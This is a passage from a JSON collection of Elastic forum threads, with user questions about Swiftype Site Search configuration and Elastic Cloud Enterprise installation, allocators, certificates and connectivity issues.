    "body": "Hi Guys I am new to Swiftype and I have set up my first engine in the dashboard. Swiftype is complaining that its not able to find sitemap on my website https://broadcastseo.com.au when I definitely know that there is a sitemap. I even verified using an external tool - and sitemap exists here - https://broadcastseo.com.au/sitemap.xml How to get past this problem? Amit",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "1d40b9f4-fa73-4591-aa54-ce3f0f3308bc",
    "url": "https://discuss.elastic.co/t/site-or-app-search-indexing-issues/173306",
    "title": "Site or App Search? Indexing issues",
    "category": [
      "Site Search"
    ],
    "author": "3morrow",
    "date": "March 21, 2019, 1:05pm March 21, 2019, 1:05pm March 21, 2019, 2:26pm April 18, 2019, 2:26pm",
    "body": "Trying to enable site-wide search across a database of Shakespeare films; each film has slightly different timings for these lines, and the interactive transcripts are stored along with their corresponding video as JSONs in an S3 bucket. Lines in a script are stored as anchor tags for users to jump to a particular line and share it (eg line 606 of Macbeth has an anchor link of https://scriptspeare.co.uk/Tragedy/Macbeth/#606=line when clicked on). Search bar should display each line as a result (for example, typing in ‘to be’ should bring up ‘to be or not to be, that is the question’ (#1611=line). Currently stuck on a few bugs in Elastic's Site Search trial (no lines show up! photo attached), but thinking this might not be the correct format since the queries are to individual word indices, rather than the IDs of lines within a page. Highly likely that I'm missing something obvious as well; Shakespeare fans, help appreciated! https://scriptspeare.co.uk/Tragedy/Macbeth/0/ Screen Shot 2019-03-21 at 12.31.50.png2026×650 34 KB",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "865ff9ef-9eb9-4d00-bf19-a6b68d44463c",
    "url": "https://discuss.elastic.co/t/how-do-you-block-bots/169853",
    "title": "How do you block bots?",
    "category": [
      "Site Search"
    ],
    "author": "slhuber",
    "date": "February 28, 2019, 11:58am March 13, 2019, 8:46pm April 10, 2019, 8:45pm",
    "body": "We are starting to get a lot of bot hits in our Swiftype search and I was wondering if anyone else has had this issue and what you did to solve it? I don't see any captcha feature available and the volume of this bot traffic is messing up our query limit as well as reporting.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "1c5dba28-321c-4425-adee-a88f38083b78",
    "url": "https://discuss.elastic.co/t/how-do-i-sort-of-filter-based-on-score/168911",
    "title": "How do I sort of filter based on _score?",
    "category": [
      "Site Search"
    ],
    "author": "mt-at-td",
    "date": "February 18, 2019, 11:51pm February 19, 2019, 5:09pm March 12, 2019, 5:55pm April 9, 2019, 5:52pm",
    "body": "If I follow the syntax of https://swiftype.com/documentation/site-search/searching/sorting and use sort_field: {page: \"_score\"} I get the error {sort_field: {page: [\"DocumentType 'page' does not have a field '_score'.\"]}} If I try to filter with filters: {page: {_score: '!1'}} as in https://swiftype.com/documentation/site-search/searching/filtering I get the error {filters: {page: [\"DocumentType 'page' does not have a field '_score'.\"]}}",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "5359b28c-94ca-43eb-a943-f59dc27d18d8",
    "url": "https://discuss.elastic.co/t/changing-filters-dynamically/170085",
    "title": "Changing filters dynamically",
    "category": [
      "Site Search"
    ],
    "author": "cakePlease",
    "date": "February 27, 2019, 1:39am February 27, 2019, 6:33am February 27, 2019, 3:17pm March 27, 2019, 3:17pm",
    "body": "Hi there, We're using the jquery client library for our custom search along with using \"domain-identifier\" to filter our results from 3 different domains. Im having a hard time trying to figure out how to use the jquery swiftype-search-jquery to change the filter parameter and have it picked up by the plugin object. Currently have 3 call to actions, each with a click event to build a new filter object, however i dont know how to pass this changed object to the existing $el.swifttypeSearch({}) object. I hope that makes sense. var searchScope = function(){ ....some biz logic here... if(onClickSearchScope>0){ return {'page': {'domain-identifier':onClickSearchScope}}; } else { return {}; } }; $('.st-default-search-input').swiftypeSearch({ resultContainingElement: '.st-search-container', engineKey: 'myEngineIDHere', renderFunction: customRenderFunction, perPage: 20, filters: searchScope() }); Any help would be appreciated",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "6e51506b-3dfa-4c53-9a35-c42b0b68b08e",
    "url": "https://discuss.elastic.co/t/swifttype-crawl-rate/169709",
    "title": "Swifttype Crawl Rate",
    "category": [
      "Site Search"
    ],
    "author": "legislat.io",
    "date": "February 24, 2019, 9:06am February 24, 2019, 5:56pm February 24, 2019, 6:45pm February 24, 2019, 6:59pm March 24, 2019, 6:59pm",
    "body": "I'm trialing the service to see if it will help a project we're working on. but I don't seem to get the crawler working across the site. I fed it the seed and a sitemap, but it only crawls 20 pages in 12 hours, vs the many thousand pages that exist. Is there a better way to get the crawler working? or crawl with another tool then upload a url list?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "d22aefd5-807d-4005-9e86-d831c2f4363c",
    "url": "https://discuss.elastic.co/t/bulk-import-synonyms/168018",
    "title": "Bulk import synonyms",
    "category": [
      "Site Search"
    ],
    "author": "elitzur_e",
    "date": "February 12, 2019, 11:24am February 12, 2019, 5:48pm March 12, 2019, 5:48pm",
    "body": "Hi, after buying the site search my customer would like to have some way to import a large amount of synonyms. is there any ways to do this? i didnt see an Api reference to do this. (even if its to create one at a time...) thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "6a3b2018-14e1-4626-a1ac-5acc8e36e589",
    "url": "https://discuss.elastic.co/t/inconsistencies-in-search-results-with-and-without-special-characters/165091",
    "title": "Inconsistencies in search results with and without special characters",
    "category": [
      "Site Search"
    ],
    "author": "haraldurkarls",
    "date": "January 21, 2019, 4:49pm February 18, 2019, 4:49pm",
    "body": "I am getting different results depending if I input the search term with Icelandic characters or replace them with \"fallback\" characters using only the English alphabet. Query: framtíðarreikningur image.png973×394 49.8 KB Notice how matching words in response are not in bold font. Query: framtidarreikningur image.png976×389 52.9 KB Matching words are correctly in bold font. When querying the API directly I am getting same results. When using Icelandic characters the highlight object is empty.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "d0220f32-edc7-409b-bbef-58ecc755b74d",
    "url": "https://discuss.elastic.co/t/get-all-documents-within-document-type-not-working/163332",
    "title": "Get all documents within document_type not working",
    "category": [
      "Site Search"
    ],
    "author": "Marvin1",
    "date": "January 8, 2019, 10:05am January 10, 2019, 12:00pm January 10, 2019, 4:55pm January 10, 2019, 4:55pm",
    "body": "today I tried to use the api-call for listing all documents within a document_type but I didnt get all documents, I just get about 50 documents but I have atleast more than 65. Is there a limit for receiving documents? How I can get all documents within a document_type? API-Call: /api/v1/engines/{engine_id}/document_types/{document_type_id}/documents.json",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "36f60bef-1955-41f9-8de5-19f201560ff1",
    "url": "https://discuss.elastic.co/t/add-a-new-page-to-be-indexed-maunaly-via-api/160783",
    "title": "Add a new page to be indexed maunaly via api",
    "category": [
      "Site Search"
    ],
    "author": "elitzur_e",
    "date": "December 13, 2018, 4:47pm December 13, 2018, 5:04pm December 13, 2018, 5:09pm December 13, 2018, 7:05pm December 16, 2018, 10:52am January 13, 2019, 10:52am",
    "body": "Hello. i am trying to use swiftype web search that already crawled my site and manualy add a page. when trying to add content like this: { \"auth_token\": \"________\", \"document\": { \"external_id\": \"2\", \"fields\": [ {\"title\": \"title\", \"body\": \"viper123\", \"type\": \"string\"} ]} } i get: \"error\": \"This API action is prohibited on Engines created using the Swiftype web crawler.\" why is that? thanks",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "a5982864-8558-4b47-9ed1-bac3393f4a89",
    "url": "https://discuss.elastic.co/t/about-the-elastic-cloud-enterprise-category/66274",
    "title": "About the Elastic Cloud Enterprise category",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "nordbergm",
    "date": "November 10, 2018, 11:40pm July 6, 2017, 1:47pm",
    "body": "The Elastic Cloud Enterprise forum is dedicated to all questions related to Elastic’s on-premise Elastic Stack service.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "8806a47e-55e5-49d2-9bb0-1b875db5fcab",
    "url": "https://discuss.elastic.co/t/private-rsa-key-for-security-certificate-management/228556",
    "title": "Private RSA Key for Security Certificate Management?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "gfidler",
    "date": "April 17, 2020, 6:32pm",
    "body": "I am trying to update the self-signed certificate with a real certificate from AWS. I retrieved the certificate chain from AWS with: aws acm get-certificate --certificate-arn <ARN-HERE> The response is JSON containing \"Certificate\", and \"CertificateChain\" I am trying to format a proper PEM to use for the upload. So the question is, \"What goes where?\" I assume the CertificateChain is as the name says. Where is the Private RSA Key supposed to come from?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "16089768-4fe7-4365-8017-0ad31e274691",
    "url": "https://discuss.elastic.co/t/api-call-failure-from-ibm-ace-server-to-elasticsearch/228150",
    "title": "API call failure from IBM ACE server to Elasticsearch",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "",
    "date": "April 15, 2020, 3:07pm April 15, 2020, 4:40pm April 15, 2020, 5:09pm April 15, 2020, 6:11pm April 15, 2020, 6:12pm April 15, 2020, 6:20pm",
    "body": "",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "7b2eedac-4ba4-4b64-af48-f9033cc1d887",
    "url": "https://discuss.elastic.co/t/how-do-ece-cloud-ui-hot-warm-and-index-management-hot-warm-join-up/227956",
    "title": "How do ECE Cloud UI Hot-Warm and Index Management Hot-Warm join up",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "david.preston",
    "date": "April 14, 2020, 3:52pm April 14, 2020, 8:56pm April 14, 2020, 8:54pm April 15, 2020, 10:57am April 15, 2020, 1:55pm April 15, 2020, 2:51pm April 15, 2020, 3:04pm April 15, 2020, 3:50pm April 15, 2020, 5:13pm",
    "body": "I've been working through the Elastic documentation, starting here: https://www.elastic.co/guide/en/cloud-enterprise/current/ece-configuring-ece-tag-allocators.html The guide walks through the setting up of Hot-Warm allocators/allocator templates. I've configured a set of allocators, via templates, to be hot, and a set for warm, as per docs. The intention is that new data/docs/indexes are written to the hot allocators/hosts, and a lifecycle policy will cause the movement of these indexes over to warm allocators/hosts, when certain conditions are met (e.g. older than n-days, or more than n-docs). After completing the section in Cloud UI - the guide moves into configuring the life cycle policies in Kibana/Index Management. In Kibana, I've created a life-cycle policy, and associated it with a test index, which I've created, but I cant find anywhere within the index life-cycle settings, or documentation, where there is any association to configuration made to my allocators and allocator templates in Cloud UI. Furthermore, I can see the warning: No node attributes configured in elasticsearch.yml You can't control shard allocation without node attributes. and looking into this - it is suggested that I need to create additional node configuration in the elasticsearch.yml - but this additional config (from what i can make out), also, doesn't appear to link back to the config I created in Cloud UI. I've searched for similar error messages which led me here: https://stackoverflow.com/questions/60061442/elastic-search-no-node-attributes-configured-in-elasticsearch-yml-you-cant-co This stack-overflow post suggests additional configuration, which looks separate, but similar in intent, to what I have already configured in Cloud UI, and is not mentioned in the documentation. How does this all tie up, what are the missing bits? Are two separate, possibly differing versions, of behaviours getting mixed up?",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "f60b41e4-a81d-451c-b5ef-1dcf04638f8f",
    "url": "https://discuss.elastic.co/t/cross-cluster-replication-in-ece-2-4/227832",
    "title": "Cross Cluster Replication in ECE 2.4",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "",
    "date": "April 14, 2020, 12:45am April 14, 2020, 6:49am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "c7c40512-e549-4a44-b2d1-168ef9726bc6",
    "url": "https://discuss.elastic.co/t/automatically-configuring-kibana-settings-indexes-visualizations-dashboards-on-ece/227169",
    "title": "Automatically configuring Kibana settings (indexes, visualizations, dashboards) on ECE",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "",
    "date": "April 8, 2020, 3:42pm April 8, 2020, 4:18pm April 8, 2020, 4:23pm April 8, 2020, 4:23pm April 8, 2020, 4:38pm April 8, 2020, 5:07pm April 8, 2020, 5:25pm April 22, 2020, 5:25pm",
    "body": "",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "a65820a4-18a9-476d-bad8-0fe8f7c82776",
    "url": "https://discuss.elastic.co/t/organization-scope/222680",
    "title": "Organization scope",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Chen_Levi",
    "date": "March 9, 2020, 10:16am March 9, 2020, 2:33pm March 24, 2020, 7:46am March 23, 2020, 8:18pm March 23, 2020, 9:17pm March 26, 2020, 7:53pm March 27, 2020, 1:27pm April 10, 2020, 1:27pm",
    "body": "Hi We were trying to create our first elastic cluster on GCP to be integrates with our gke cluster. The wierd part is that it wasn’t seems like there is an option to create an organization scope and to invite team members to the cluster. Can it be ? Thanks Chen",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "487c1cef-fafc-4d23-a77d-5af5852a7d8a",
    "url": "https://discuss.elastic.co/t/move-allocator-from-one-zone-to-another/225204",
    "title": "Move Allocator from one zone to another?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "JPeery",
    "date": "March 26, 2020, 1:54pm March 26, 2020, 2:37pm April 9, 2020, 2:22pm",
    "body": "Is there a way to move an Allocator from one zone to another without having to reinstall? I had an allocator that was unhealthy, I ended up deleting it, re-provisioning the VM, and re-built from scratch, but when I installed I passed it the wrong zone, was hoping there's an easier way to move it to the correct zone without having to go through all that re-install again.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "ea524913-f110-40be-9777-e21839786fde",
    "url": "https://discuss.elastic.co/t/how-to-get-the-cluster-id-to-setup-nginx-proxy-for-iframe-authentication/224914",
    "title": "How to get the cluster ID to setup nginx proxy for iframe authentication",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "seppar",
    "date": "March 25, 2020, 5:27pm March 25, 2020, 8:06am March 25, 2020, 4:28pm March 25, 2020, 5:31pm April 22, 2020, 5:31pm",
    "body": "I'm trying to set up an Nginx proxy to log in so that my iframes are already logged in. I'm not sure how to get access to cluster ID",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "53aae3c8-fc91-478c-9dfd-9679b3ef2afd",
    "url": "https://discuss.elastic.co/t/ece-unhealthy-platform-internal-server-error/222714",
    "title": "ECE Unhealthy platform, internal server error",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "mesiasc",
    "date": "March 9, 2020, 1:05pm March 9, 2020, 2:27pm March 9, 2020, 2:43pm March 9, 2020, 2:52pm March 9, 2020, 3:08pm March 9, 2020, 3:12pm March 9, 2020, 3:15pm March 9, 2020, 3:16pm March 9, 2020, 3:22pm March 9, 2020, 3:31pm March 9, 2020, 3:29pm March 9, 2020, 3:32pm March 9, 2020, 3:36pm March 9, 2020, 3:47pm March 9, 2020, 3:52pm March 9, 2020, 3:56pm March 9, 2020, 4:04pm March 9, 2020, 4:21pm March 9, 2020, 4:43pm March 10, 2020, 9:08am",
    "body": "My ECE had hosting related problems. I lost the host which was initially the first installed host. This left two remaining hosts. The ECE UI shows \"There was an internal server error\" The platform was initially installed with v 2.4.1 I created a token to add a new host to the platform and went through the steps similar to the original install, however there was an error relating to the version of the downloaded install / bootstrap script which is v 2.4.3 Is it possible to download older versions of the ECE install / bootstrap script? Or should I try to upgrade the fragments of the already compromised platform? Any tips?",
    "website_area": "discuss",
    "replies": 21
  },
  {
    "id": "173560a9-ec94-418e-a71a-55e4f4f871f1",
    "url": "https://discuss.elastic.co/t/watcher-cannot-update-mail-settings/224674",
    "title": "Watcher- cannot update mail settings",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "liorg2",
    "date": "March 23, 2020, 12:53pm March 23, 2020, 1:24pm March 23, 2020, 2:06pm March 23, 2020, 2:37pm March 23, 2020, 6:31pm April 6, 2020, 6:31pm",
    "body": "hello, can you please assist with the following error? I'm trying to configure smtp in order to use watcher image850×670 42.7 KB image699×157 6.84 KB",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "72d09fa9-ad48-445c-a987-af1c349332bd",
    "url": "https://discuss.elastic.co/t/kibana-logs-in-cloud-elastic-co/224675",
    "title": "Kibana logs in cloud.elastic.co",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "liorg2",
    "date": "March 23, 2020, 12:55pm March 23, 2020, 1:21pm March 23, 2020, 1:56pm March 23, 2020, 2:35pm April 6, 2020, 2:36pm",
    "body": "hello, can I access kibana logs in the elastic cloud? if yes- then where should I look for them? I only have one 'Logs' in the menu under elasticsearch thanks!",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "81ab9cac-f2a9-4cd8-bc3a-e179cc1c9d99",
    "url": "https://discuss.elastic.co/t/cannot-create-deployments-in-ece/224184",
    "title": "Cannot create deployments in ECE",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "akimbah",
    "date": "March 18, 2020, 8:39pm March 20, 2020, 3:24pm March 20, 2020, 3:55pm March 20, 2020, 4:13pm April 3, 2020, 4:16pm",
    "body": "I'm unable to create deployments. When I go to create deployments I get a \"fetching regions failed\" error. image2539×574 77.3 KB",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "0db55416-1b4e-4c95-8ff7-feddaa428e67",
    "url": "https://discuss.elastic.co/t/cert-error-connecting-standalone-vm-logstash-to-docker-ece-build/221109",
    "title": "Cert error connecting standalone vm logstash to docker ece build?",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "",
    "date": "February 26, 2020, 8:34pm February 26, 2020, 8:52pm February 26, 2020, 8:59pm February 27, 2020, 2:41pm March 15, 2020, 9:50pm March 16, 2020, 3:31pm March 16, 2020, 4:11pm March 16, 2020, 4:45pm March 16, 2020, 7:20pm March 16, 2020, 9:07pm March 16, 2020, 9:10pm March 16, 2020, 10:00pm March 16, 2020, 10:12pm March 16, 2020, 10:35pm March 30, 2020, 10:35pm",
    "body": "",
    "website_area": "discuss",
    "replies": 15
  },
  {
    "id": "24dc7c7f-23dd-4b7b-9995-667d06994846",
    "url": "https://discuss.elastic.co/t/cannot-install-ece-onto-ubuntu-16-04/222961",
    "title": "Cannot install ECE onto Ubuntu 16.04",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "akimbah",
    "date": "March 10, 2020, 2:52pm March 10, 2020, 3:19pm March 10, 2020, 8:20pm March 10, 2020, 8:38pm March 10, 2020, 9:03pm March 10, 2020, 9:06pm March 11, 2020, 6:18pm March 12, 2020, 6:08pm March 12, 2020, 6:20pm March 26, 2020, 6:20pm",
    "body": "image962×876 35.7 KB I am attempting to install ECE 2.4.3 onto an EC2 instance of Ubuntu 16.04. Keep getting stuck in this portion. Attached a screenshot of the --debug information above. Please advise",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "08dc15e4-4ca6-45e0-acdc-c20dbba5ec4c",
    "url": "https://discuss.elastic.co/t/elastic-cloud-entreprise-saml/222705",
    "title": "Elastic cloud entreprise - saml",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "raphperrin",
    "date": "March 9, 2020, 12:27pm March 9, 2020, 2:34pm March 10, 2020, 6:05am March 10, 2020, 12:54pm March 10, 2020, 1:12pm March 10, 2020, 1:54pm March 10, 2020, 2:01pm March 10, 2020, 9:09pm March 11, 2020, 5:54am March 11, 2020, 12:27pm March 11, 2020, 2:28pm March 25, 2020, 2:28pm",
    "body": "Hi I am trying to configure the SAML authentication to secure one of my elastic cloud cluster. I added the configuration \"user_bundles\": [ { \"name\": \"saml-metadata\", \"url\": \"https://servername/saml-metadata.zip\", \"elasticsearch_version\": \"7.6.0\" } ], But the configuration never applies, I don't see any errors in the logs. I've done it with a non cloud entreprise and it did work since I am able to provide the file directly on the system. any help, please Raphael",
    "website_area": "discuss",
    "replies": 12
  },
  {
    "id": "a9549c69-ac4b-4e23-8bc5-b08969292f74",
    "url": "https://discuss.elastic.co/t/evaluation-cluster-unable-to-scale-to-second-zone/222967",
    "title": "Evaluation Cluster - Unable to Scale to Second Zone",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "gfidler",
    "date": "March 10, 2020, 3:36pm March 10, 2020, 4:03pm March 10, 2020, 4:23pm March 10, 2020, 8:20pm March 11, 2020, 3:45pm March 25, 2020, 12:23pm",
    "body": "Summary I am deploying a baseline cluster in AWS for evaluation. The software configuration and deployment on both nodes seems correct, according to the documentation. VM memory settings are default. (I had issues setting memory settings during install). Allocators are in 2 zones. The second allocator currently has no nodes deployed. I'm trying to deploy Elasticsearch and Kibana on the second allocator by setting 2 zones for these nodes in admin-console-elasticsearch. This configuration fails. What am I missing? Issue Out of capacity There is not enough capacity to complete your configuration change. The Allocators page indicates how much capacity is available. To resolve this situation either add more capacity or move nodes around . One of the following changes is likely to be the culprit: Set size to 4 GB RAM data.default Set nodes per zone to 1 data.default Set zones to 2 data.default Hardware 2 x i3.4xlarge instances (High I/O, 16 CPU, 122GB Memory, 300GB Storage)",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "41cf520e-7978-4108-a33d-be25b4ffb4f6",
    "url": "https://discuss.elastic.co/t/ece-on-virtual-machines/222580",
    "title": "ECE on Virtual Machines",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "tlazarus",
    "date": "March 7, 2020, 11:04pm March 8, 2020, 6:27am March 22, 2020, 6:27am",
    "body": "I'm hoping that someone else is running ECE on top of virtual machines, preferably on-premise, and would be willing to discuss their configuration. Using virtual machines rather than a bare-metal deployment obviously complicates things since ECE has no understanding of virtualization. I'm particularly concerned with having multiple nodes on the same host that contain the primary and secondary shards for an index and loss of the host. While I am familiar with pinning virtual machines to hosts, I'm trying to make this as easy to manage as possible. Thanks! Tim",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "b777c00f-09fa-4834-a7e4-df3e5fc40016",
    "url": "https://discuss.elastic.co/t/cant-remove-allicator-role-from-first-host/221923",
    "title": "Can't remove allicator role from first host",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "andrew.luke",
    "date": "March 3, 2020, 4:59pm March 3, 2020, 5:15pm March 3, 2020, 6:43pm March 3, 2020, 7:49pm March 4, 2020, 3:18pm March 4, 2020, 4:02pm March 4, 2020, 5:36pm March 5, 2020, 12:24pm March 19, 2020, 12:25pm",
    "body": "We've deployed a 2 AZ ECE enclave (for lack of a better term). The first host has all the roles enabled on it by default. We've added other hot/warm allocators in each AZ, and we're trying to move the running nodes/instances off the first allocator as in: https://www.elastic.co/guide/en/cloud-enterprise/current/ece-topology-example3.html ece-instance-move690×573 114 KB Some of the instances failed to move with a red X on them now. Is there an additional step (change move settings?) to get all instances to move off the first host so the allocator role can be removed? If we move the admin console instance, does the IP of the cloud UI change to the new allocator? Edit: The error message from the deployment activity (on admin console deployment) is: There was a problem applying this configuration change [validate-plan-prerequisites]: [no.found.constructor.validation.ValidationException: 1. Can't apply a move_only plan with topology / setting changes. Actions: [settings]]",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "dfa53de0-4ae6-496a-833d-7c721f57f131",
    "url": "https://discuss.elastic.co/t/adding-tag-to-allocator-gives-internal-server-error-message/222104",
    "title": "Adding Tag to Allocator gives \"internal server error\" message",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "lcarr",
    "date": "March 4, 2020, 3:15pm March 4, 2020, 5:40pm March 18, 2020, 5:40pm",
    "body": "When we try to add a tag to the allocator we are getting an \"internal server error\" - the server configuration is 16GB of RAM to 50Gb of storage - could this error be due to the lack of storage available? We thought it might be causing us an issue. Thanks,",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "b345e5ad-8413-419d-a51a-02396557f8db",
    "url": "https://discuss.elastic.co/t/install-script-failing-with-python-error-new/221082",
    "title": "Install script failing with python error (new)",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "andrew.luke",
    "date": "February 26, 2020, 5:20pm February 26, 2020, 7:11pm February 26, 2020, 7:40pm February 26, 2020, 8:03pm February 27, 2020, 6:54pm February 27, 2020, 7:12pm February 28, 2020, 1:00pm February 28, 2020, 3:01pm February 28, 2020, 3:28pm February 28, 2020, 4:08pm March 3, 2020, 12:56pm March 3, 2020, 5:27pm March 17, 2020, 5:27pm",
    "body": "This morning we had two different groups setting up a new ECE lab on prem and in Azure. Both are hitting the same error with the install script. We are both installing on RHEL 7.7 that has been prepared according to the documentation. Both groups had previous successful installs a few weeks ago in a smaller POC. It looks like its a python error: Fatal Python error: Py_Initialize: Unable to get the locale encoding ImportError: No module named 'encodings' I noticed something about python 3 later on in the error and I'm pretty sure RHEL 7.7 comes with python 2.7. Something must have changed in the install script since we last ran it, and now it doesn't work on systems prepared according to documentation. Any thoughts would be appreciated. Full error below. Unable to find image 'docker.elastic.co/cloud-enterprise/elastic-cloud-enterprise:2.4.3' locally Trying to pull repository docker.elastic.co/cloud-enterprise/elastic-cloud-enterprise ... 2.4.3: Pulling from docker.elastic.co/cloud-enterprise/elastic-cloud-enterprise 100c7683cffa: Pull complete 6a7b32ded68c: Pull complete Digest: sha256:bd081297a163847271fa9e7953f72a4d7a683a5d3953eefee15576c1b68df109 Status: Downloaded newer image for docker.elastic.co/cloud-enterprise/elastic-cloud-enterprise:2.4.3 Fatal Python error: Py_Initialize: Unable to get the locale encoding ImportError: No module named 'encodings' Current thread 0x00007fc2018f7740 (most recent call first): /usr/bin/elastic-cloud-enterprise-installer: line 4: 8 Aborted (core dumped) python3 /elastic_cloud_apps/bootstrap-initiator/initiator.py",
    "website_area": "discuss",
    "replies": 13
  },
  {
    "id": "cb11da95-5ec6-48eb-a577-97f74805c520",
    "url": "https://discuss.elastic.co/t/remove-instance-from-ece-cluster-on-ece-2-4/218005",
    "title": "Remove instance from ECE cluster on ECE 2.4",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "tazikm",
    "date": "February 5, 2020, 3:18pm February 6, 2020, 8:01pm February 6, 2020, 8:28pm February 6, 2020, 9:25pm February 6, 2020, 9:28pm March 31, 2020, 11:31am",
    "body": "Hi, I want to remove definively an instance from one of my cluster on ECE 2.4 please let know how to complete this thanks in advance Kamal",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "948254d3-dff2-4f6a-bcb3-b52f72032ee8",
    "url": "https://discuss.elastic.co/t/cant-connect-to-coordinator-host-when-using-emergency-role-token/221218",
    "title": "Can't connect to COORDINATOR_HOST when using emergency role token",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Andrew_Riley",
    "date": "February 27, 2020, 11:38am February 27, 2020, 5:14pm March 12, 2020, 2:38pm",
    "body": "I'm trying to recover my ECE instance after losing my co-ordinator server. The information on Using Emergency Roles token says to run install --coordinator-host 192.168.50.10 --roles-token {token} specifying the old co-ordinator host, but the installation validation output says; Checking coordinator connectivity ... FAILED Can't connect COORDINATOR_HOST [ip.address] connection refused I don't understand this message, because losing the coordinator host is why I'm using the emergency all roles token. What am I misunderstanding?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "97f5f13e-67f7-4f13-b21f-7f5ee27ca046",
    "url": "https://discuss.elastic.co/t/problems-connecting-an-ec2-instances-with-logstash-on-to-the-elastic-cloud/220865",
    "title": "Problems connecting an ec2 instances with logstash on to the elastic cloud",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "Apollyon",
    "date": "February 25, 2020, 1:47pm February 25, 2020, 2:45pm February 26, 2020, 1:28pm February 26, 2020, 2:14pm February 26, 2020, 2:17pm February 26, 2020, 3:16pm February 26, 2020, 4:13pm February 26, 2020, 7:25pm February 27, 2020, 4:38pm March 12, 2020, 12:25pm",
    "body": "Hello there, In need of some help, have newly come around the realm of AWS and the Elastic Cloud set up(s). Have recently set up and configured an Logstash agent in an ec2 instance. On the output of this, I would like this to be able to output to the Elastic Cloud set up so the data is able to be stored in the Eleasticsearch database and therefore seen in the Kibana console. I can curl to the elastic cloud instances from the ec2 instance within AWS but cannot output using Logstash on the ec2 instances. For the Eleasticsearch in the Elastic Cloud, this does come with X-Pack on deployment as the security features, centralized pipeline management etc is seen under the management area within Kibana. For the config of the Logstash agent which is built on the ec2 instance. Have tried both using the hostname, user and password configs and have also attempted with the config of using the cloud.id and cloud.auth. As I can curl from the cli on the logstash agent to the elastic cloud and get the elasticsearch response from it. Would this probably no be a port allocation issue? or would it when going via logstash as when looking have seen this comment being made if it is using cloud.id for monitoring then that's the problem because it gives the wrong URL in ECE (it's designed for ESS) as you can see by base64 decoding it .. it uses :443 as the port not :9243 (which is the ECE default). So To make applications play nice with cloud.id in ECE you have to use (eg) iptables to map 443 to 9243 Within the Logstash.yml from the xpack setting the certs needed will need to be added when/ if the ssl=true? When the error of LogStash::LicenseChecker::LicenseError: Failed to fetch X-Pack information from Elasticsearch. This is likely due to failure to reach live Elasticsearch cluster This means that there needs to be a manual way to set X-Pack correctly on Elastic Cloud? or would this be Logstash? If on Logstash, with the certs from elasticsearch from the elastic cloud how would you be able to do this/ get this? If in turn, the would need be, to create a logstash instances within the elastic cloud environment. Then on the ec2 instance output logstash to the elastic cloud logstash which will then internally push it to elasticsearch? Thank you!",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "820e5faf-33f9-405f-bb88-14f37779405f",
    "url": "https://discuss.elastic.co/t/bind-elastic-cloud-enterprise-communications-to-a-specific-interface/220618",
    "title": "Bind Elastic Cloud Enterprise communications to a specific interface",
    "category": [
      "Elastic Cloud Enterprise"
    ],
    "author": "donny007x",
    "date": "February 24, 2020, 10:05am February 26, 2020, 8:35am February 24, 2020, 3:50pm February 24, 2020, 5:05pm February 26, 2020, 8:36am March 11, 2020, 8:36am",
